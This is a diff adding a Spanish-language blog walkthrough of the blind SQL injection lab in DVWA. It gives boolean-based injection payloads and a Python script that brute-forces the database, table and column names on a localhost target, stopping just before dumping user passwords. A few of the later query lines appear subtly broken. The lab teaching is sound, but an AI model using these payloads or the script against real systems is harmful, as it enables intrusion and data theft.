@@ -448,5 +448,387 @@ Nos responde el mensaje "User ID exists in the database.", y en caso de que el v
 
 Pero al parecer no nos está devolviendo ninguna columna, ya que no vemos algo más allá de eso, pero tenemos en cuenta que ya hay 2 posibilidades de respuesta, el exist y missing, algo como un verdadero y falso, ahora trataremos de buscar si es vulnerable a inyecciones SQL.
 
-Primero interceptaremos una petición:
+Primero interceptaremos una petición y de id le daremos un valor que sea Missing o sea que no exista algo así como un false, así que por ejemplo sabemos que solo hay 5 usuarios, así que le pasaremos un 22:
+
+![22](/assets/images/DVWA-SQLi/SQLiBlind-easy/22.png)
+
+Podemos apreciar que nos responde un User ID is "MISSING from the database.", ahora intentaremos inyectar el OR 1=1, escapando del campo del ID y inyectando esto y en teoria si es vulnerable de esta forma deberemos ver algo como que el usuario existe, ya que esta validando el OR y no lo primero.
+
+Así que al hacer esta consulta:
+
+`id=22' OR 1=1 -- -`
+
+Vemos que nos arroja el siguiente error:
+
+![err](/assets/images/DVWA-SQLi/SQLiBlind-easy/error.png)
+
+Y esto puede deberse a que no lo estamos poniendo en formato URL, así que seleccionaremos nuestra consulta y cuando la seleccionemos toda pulsaremos ctrl + u para url-encodearlo y nos quedará así:
+
+![url](/assets/images/DVWA-SQLi/SQLiBlind-easy/urlencode.png)
+
+> Este formato es el que agrega un navegador para que el servidor logre interpretarlo sin errores, pero como estamos desde burp debemos hacerlo manualmente.
+
+Al tramitar la petición en este formato podemos apreciar que ya nos responde correctamente:
+
+![exist2](/assets/images/DVWA-SQLi/SQLiBlind-easy/exist2.png)
+
+Sabemos que es vulnerable ya que nos marca como Existente un ID que no era valido, y sabemos esto ya que la consulta ha tomado el valor inyectado del OR, y con esto podremos hacer muchas cosas, hasta enumerar datos con esta vulnerabilidad SQLi basada en respuestas condicionales.
+
+<br>
+
+Primero intentaremos enumerar las bases de datos, como esta vulnerabilidad es ciega y solo tendremos respuestas condicionales que en base a ello sabremos si la consulta devuelve un true o false, lo que haremos primero es saber la longitud del nombre de la base de datos actual:
+
+`1' AND (SELECT LENGTH(database()))=4 -- -`
+
+> Hay veces que varia entre usar el OR o el AND, ya que alguno puede responder bien y otro no, es algo de ir probando.
+
+En esta consulta estamos indicandole que nos tome el valor de la longitud de la base de datos actual y la compare con el valor 4.
+
+![length](/assets/images/DVWA-SQLi/SQLiBlind-easy/length.png)
+
+y podemos apreciar que nos responde "User ID exist in the database.", por lo que podemos asumir que el tamaño de longitud de la base de datos actual es 4, esto de **d** **v** **w** **a**, pero en un entorno real tendremos que probar con operadores mayor o menor para llegar al tamaño, en este caso sabemos que es 4 y esto para ahorrar tiempo ya sabemos que la base de datos actual es dvwa y por eso nos responde la respuesta true.
+
+No esta de más probar otro digito incorrecto para ver que la logica funcione y no nos este dando un falso positivo:
+
+`1' AND (SELECT LENGTH(database()))=55 -- -`
+
+En este caso pusimos el valor 55, el cual sabemos que debe retornarnos falso:
+
+![false](/assets/images/DVWA-SQLi/SQLiBlind-easy/false.png)
+
+Y podemos apreciar que así es, por lo que ya sabemos que la lógica de la inyección esta funcionando y podemos continuar.
+
+<br>
+
+En este punto, lo siguiente es enumerar el nombre de la base de datos actual, para ello podemos crear la siguiente consulta:
+
+`1' AND (SELECT SUBSTRING(database(),1,1))='a' -- -`
+
+Con esto le estamos indicando que nos seleccione el valor que devuelve la función SUBSTRING(), en este caso nos estara devolviendo el primer valor del nombre de la base de datos, y al final de la consulta comprobamos si ese valor es igual a el caracter "a".
+
+Como sabemos en caso de ser cierto nos devolvera:
+
+User ID exists in the database.
+
+Y en caso de ser falso:
+
+User ID is MISSING from the database.
+
+Y la respuesta de esa consulta anterior es la siguiente:
+
+![dba](/assets/images/DVWA-SQLi/SQLiBlind-easy/database_a.png)
+
+Podemos ver que nos dice el valor false, por lo que el primer caracter de la base de datos actual no es "a", ahora probaremos con "d":
+
+`1' AND (SELECT SUBSTRING(database(),1,1))='d' -- -`
+
+![dbd](/assets/images/DVWA-SQLi/SQLiBlind-easy/database_d.png)
+
+Y vemos que nos responde la respuesta verdadera, por lo que ya sabemos que inicia con la letra "d".
+
+En este punto tendriamos que ir recorriendo el valor de la funcion SUBSTRING() para ir enumerando los siguientes caracteres, pero como esto es tardado manualmente, haremos un script para que nos automatize el fuzzing.
+
+```python
+
+#!/usr/bin/python3
+
+from pwn import *
+import requests, signal, time, pdb, sys, string
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+#CTRL+C
+signal.signal(signal.SIGINT, def_handler)
+
+main_url = "http://localhost/DVWA/vulnerabilities/sqli_blind/"
+characters = string.ascii_lowercase + string.digits + "_" + "-" + "$"
+
+def makeRequest():
+    
+    database = ""
+
+    p1 = log.progress("Enumerar base de datos")
+    p1.status("Iniciando ataque de fuerza bruta para enumerar el nombre de la base de datos actual")
+
+    time.sleep(2)
+
+    p2 = log.progress("database name")
+
+    for position in range(1,5):
+
+        for character in characters:
+            url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(database(),%d,1))='%s'+--+-&Submit=Submit" % (position, character)
+
+            cookies = {
+                'PHPSESSID': "2nn0125e6gmk861ht73vfl74p0",
+                'security': "low"
+            }
+            
+            p1.status(url)
+
+            r = requests.get(url, cookies=cookies)
+
+            if "User ID exists in the database." in r.text:
+                database += character
+                p2.status(database)
+                break
+
+if __name__ == '__main__':
+
+    makeRequest()
+
+```
+
+Este script es similar al que usamos en post anteriores, solamente cambian algunas cosas, por ejemplo cuando usamos este script anteriormente en otro post la vulnerabilidad estaba en el campo de la cookie, pero en este caso la vulnerabilidad esta directamente en el parametro id que se tramita por el metodo GET.
+
+`characters = string.ascii_lowercase + string.digits + "_" + "-" + "$"`
+
+Aquí estamos agregando algunos digitos especiales como guion bajo o sibmolos que podrian venir en el nombre de la tabla.
+
+> Estos no son todos los simbolos especiales existentes pero son los comunes.
+
+`for position in range(1,5):`
+
+En el primer for estamos creando un ciclo que se repetira 4 veces, recuerda que en programación se inicia desde el 0 por lo que tendremos que poner que termine en 5.
+
+Esto se repetira 4 veces ya que la longitud del nombre de la base de datos es 4.
+
+`for character in characters:`
+
+En el siguiente for obtendremos cada caracter que este en la variable characters que declaramos anteriormente, esto irá iterando sobre cada posicion de esa variable.
+
+Para después en cada iteracion ejecutar lo siguiente.
+
+Primero crear una variable llamada url con la siguiente consulta:
+
+
+`1' AND (SELECT SUBSTRING(database(),1,1)='a' -- -`
+
+Pero la pondremos url encodeada y también asignarle en los valores que iran cambiando para fuzzear.
+
+url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(database(),%d,1))='%s'+--+-&Submit=Submit" % (position, character)
+
+Quedandonos así, en el %d iran iterando las posiciones de cada caracter de la base de datos, y en el %s irá el valor actual de la variable character que creamos con el for.
+
+Deśpués de asignar la consulta nos toca declarar los valores de la cookie:
+
+```python
+cookies = {
+	'PHPSESSID': "2nn0125e6gmk861ht73vfl74p0",
+	'security': "low"
+}
+```
+
+Agregamos los valores que sacamos de burpsuite para poder hacer correctamente la petición.
+
+Después haremos dicha petición por el metodo GET, la peticion se hará a el valor que esta en nuestra consulta que construimos usando las cookies que creamos.
+
+`r = requests.get(url, cookies=cookies)`
+
+Por último comprobaremos si la peticion actual nos respondio algo verdadero o no, por lo que le diremos que si el texto "User ID exists in the database." está dentro de la respuesta de la petición entonces en caso de ser cierto pasaremos a agregar el caracter que se esta probando actualmente a la variable database sin reemplazar las que ya habia.
+
+```python
+if "User ID exists in the database." in r.text:
+	database += character
+	p2.status(database)
+	break
+```
+
+Por último salimos del for ya que hemos encontrado el caracter correcto, y al salir se iterara la siguiente posicion del nombre de la base de datos, y así seguira hasta terminar de recorrer los 4 espacios.
+
+Una vez ejecutemos el script veremos que nos dumpea el nombre de la base de datos:
+
+![namedb](/assets/images/DVWA-SQLi/SQLiBlind-easy/namedatabase.png)
+
+Y vemos que la base de datos se llama "dvwa".
+
+Lo siguiente que harémos es enumerar las tablas de esta base de datos, pero primero ocupamos saber cuantas tablas existen, para ello usaremos la siguiente consulta:
+
+`1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'dvwa')=2 -- -`
+
+Le estamos diciendo que nos cuente el numero de tablas dentro de information_schema.tables, Donde el valor de table_schema o sea el nombre de la base de datos sea "dvwa", y con ese valor devuelto lo compararemos con el numero 2.
+
+Y vemos que esto nos responde lo siguiente:
+
+![count](/assets/images/DVWA-SQLi/SQLiBlind-easy/count.png)
+
+Podemos apreciar que nos responde el mensaje "User ID exists in the database.", por lo que podemos pensar que hay 2 tablas, probaremos con el valor 3 para ver que todo tenga logica y nos deberia dar error:
+
+`1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'dvwa')=3 -- -`
+
+![count3](/assets/images/DVWA-SQLi/SQLiBlind-easy/count3.png)
+
+Como vemos nos da error, por lo que sabemos que entonces hay 2 tablas y no mas o menos.
+
+<br>
+
+Ahora que sabemos que hay 2 tablas, tendremos que determinar la longitud de cada tabla, para ello usaremos:
+
+`1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa' LIMIT 1)>=5 -- -`
+
+En esta consulta le estamos indicando que nos seleccione la longitud de la tabla, la cual esta tabla la obtendremos de information_schema.tables, donde el nombre de la base de datos sea "dvwa" y limitando a 1 resultado para evitar errores, e ir en orden, y este valor lo compararemos con un valor, en este caso le diremos que si ese valor es mayor o igual a 5, y vemos que nos responde:
+
+![>=5](/assets/images/DVWA-SQLi/SQLiBlind-easy/>=5.png)
+
+Podemos ver que nos responde la respuesta True, por lo que podemos saber que la longitud de la primera tabla es igual o mayor a 5, para probar quitaremos el mayor y dejaremos solo el igual para ver si nos responde true o false, en caso de True sabremos que el valor de la longitud de la primera tabla es 5, y en caso de false quiere decir que es mas de 5.
+
+Y vemos que nos responde:
+
+![=5](/assets/images/DVWA-SQLi/SQLiBlind-easy/=5.png)
+
+Apreciamos que nos responde True, por lo que el tamaño de la longitud de la primera tabla es 5.
+
+<br>
+
+Haremos lo mismo pero esta vez para la segunda tabla, para ello usaremos la consulta anterior pero esta vez cambiando el limit:
+
+`1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa' LIMIT 1,1)>=5 -- -`
+
+Decimos que el valor de la longitud de la segunda tabla nos lo compare con el valor mayor o igual a 5.
+
+Y vemos que nos responde:
+
+![>=5](/assets/images/DVWA-SQLi/SQLiBlind-easy/>=5XD.png)
+
+Podemos apreciar que nos da el valor true, por lo que quitamos el operador de mayor >, y ejecutamos esto pero nos devolvio un estado false, por lo que intentamos con una cantidad más alta, en este caso 10:
+
+`1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa' LIMIT 1,1)>=10 -- -`
+
+![false2](/assets/images/DVWA-SQLi/SQLiBlind-easy/false2.png)
+
+Y vemos que nos responde un valor False, por lo que podemos pensar que el valor es mayor de 5 y menor de 10, aqui probaremos con algun valor entre ese rango, por ejemplo 8:
+
+`1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa' LIMIT 1,1)>=8 -- -`
+
+![true2](/assets/images/DVWA-SQLi/SQLiBlind-easy/true2.png)
+
+Vemos que nos devuelve el valor True, por lo que ahora probaremos sin el operador de mayor > y ver que responde:
+
+`1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa' LIMIT 1,1)=8 -- -`
+
+Nos da error esta consulta, pero probamos con el siguiente valor cercano a ese rango que es 9:
+
+`1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa' LIMIT 1,1)=9 -- -`
+
+Y esta vez vemos que nos devuelve True:
+
+![longitud](/assets/images/DVWA-SQLi/SQLiBlind-easy/longitud.png)
+
+Así que ya sabemos que el tamaño de longitud de la segunda tabla es 9.
+
+<br>
+
+En este punto nos tocaria enumerar los nombres de dichas tablas empezando por la primera, para ello usaremos el mismo script pero esta vez cambiaremos los mensajes que se muestran en pantalla, y lo mas importante cambiar la consulta de la variable url y las veces que se repetira el ciclo.
+
+Primero, el primer for quedará así:
+
+`for position in range(1,6):`
+
+Ya que la longitud del nombre de la primera tabla recordamos que es 5, por lo que este ciclo se repetira una vez por caracter y el siguiente for como sabemos ira fuzzeando cada valor y comprobar si ese valor es el correcto o no en base a el mensaje de respuesta.
+
+Lo siguiente a modificar fue la consulta de la variable URL que esta dentro del for anidado:
+
+La consulta normal es:
+
+1' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema = 'dvwa' limit 1)='a' -- -
+
+Pero adaptarlo a el codigo de python y url-encodeado quedaría así dentro de la variable url:
+
+`url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(table_name,%d,1)+FROM+information_schema.tables+WHERE+table_schema+='dvwa'+limit+1)='%s'+--+-&Submit=Submit" % (position, character)`
+
+Y también agregando los valores que iran fuzzeando las posiciones y caracteres.
+
+> Hay otros valores que también deben cambiarse pero no los mostre ya que es logico cambiar el nombre de los mensajes que vemos en pantalla.
+
+Y al ejecutar el script podemos apreciar que recibiremos el nombre de la primera tabla:
+
+![users](/assets/images/DVWA-SQLi/SQLiBlind-easy/users.png)
+
+Ahora descubrimos que la primera tabla se llama users.
+
+<br>
+
+Para descubrir el nombre de la segunda tabla es similar solo cambiaremos obviamente el primer for de posiciones que en este caso no será 5 si no 9:
+
+`for position in range(1,10):`
+
+Y de la variable URL donde se almacena la consulta que se probará para fuzzear cada posicion solo debemos cambiar el limit:
+
+`url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(table_name,%d,1)+FROM+information_schema.tables+WHERE+table_schema+='dvwa'+limit+1,1)='%s'+--+-&Submit=Submit" % (position, character)`
+
+Al ejecutar el script veremos el nombre de la segunda tabla:
+
+![guestbook](/assets/images/DVWA-SQLi/SQLiBlind-easy/guestbook.png)
+
+Vemos que la segunda tabla se llama guestbook.
+
+<br>
+
+Ahora tenemos las 2 tablas:
+
+- users
+- guestbook
+
+La que nos llama la atención es "users", por lo que ahora toca enumerar sus columnas.
+
+Para ello, primero debemos 
+
+`1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = 'dvwa' AND table_name = 'users')>=5 -- -`
+
+Con esta consulta estamos tomando el valor de cuantas columnas existen dentro de la base de datos dvwa donde el nombre de la tabla sea "users", y este valor lo compararemos con mayor o igual a 5.
+
+Esto nos responde:
+
+![existcolumn](/assets/images/DVWA-SQLi/SQLiBlind-easy/existcolumn.png)
+
+El valor True, por lo que ya sabemos que hay que hacer, ir jugando hasta que el igual nos de el valor exacto, para ahorrar esto no describiremos el proceso que ya sabemos hacer, por lo que al intentar descubrimos que existen 8 columnas.
+
+Tendremos que averiguar la longitud del nombre de cada una de ellas, o también podriamos hacerlo sin la longitud e intuir hasta cuando termina el nombre de una columna.
+
+Por ejemplo, ahora que lo haremos sin las longitudes, lo que haremos será lo siguiente:
+
+`1' AND (SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns WHERE table_schema = 'dvwa' AND table_name = 'users' limit 1)='a' -- -`
+
+Con esta consulta nos sirve para enumerar los nombre de las columnas, empezando por la primera, esto lo adaptaremos a el script para enumerar datos, en este caso enumeraremos los nombres de las columnas:
+
+Como esta vez no tenemos un aproximado de longitud para decirle al script cuando detenerse pondremos un 50 en el primer for:
+
+`for position in range(1,51):`
+
+Ahora toca modificar la consulta de la variable url, esta consulta es la que mostre anteriormente pero adaptada a python:
+
+`url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'+limit+1)='%s'+--+-&Submit=Submit" % (position, character)`
+
+Después ejecutaremos el script y veremos lo siguiente:
+
+![userid](/assets/images/DVWA-SQLi/SQLiBlind-easy/userid.png)
+
+Podemos ver que nos enumero el nombre de la primera columna, pero como no hay limite de caracteres el script sigue corriendo sin saber que ya no hay mas posiciones que enumerar, pero simplemente si vemos que el script ya no avanza despues de un rato podremos detenerlo con ctrl + c y así nos ahorrariamos hacer lo de obtener la longitud de cada columna ya que puede ser un poco tedioso.
+
+Así que haremos esto con las columnas restantes, jugando con cambiar el limit en cada ejecucion, y las consultas quedarian asi:
+
+`url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'+limit+1)='%s'+--+-&Submit=Submit" % (position, character)`
+
+`url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'+limit+2,1)='%s'+--+-&Submit=Submit" % (position, character)`
+
+`url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'3,1)='%s'+--+-&Submit=Submit" % (position, character)`
+
+Etc...
+
+Una vez enumeradas todas los nombres de cada columna:
+
+- user_id
+- first_name
+- last_name
+- user
+- password
+- avatar
+- last_login
+- failed_login
+
+Ya solo nos queda dumpear los datos de las columnas que nos interesan, en este caso es "user" y "password".
+
+Por lo que lo haremos con la siguiente consulta:
 
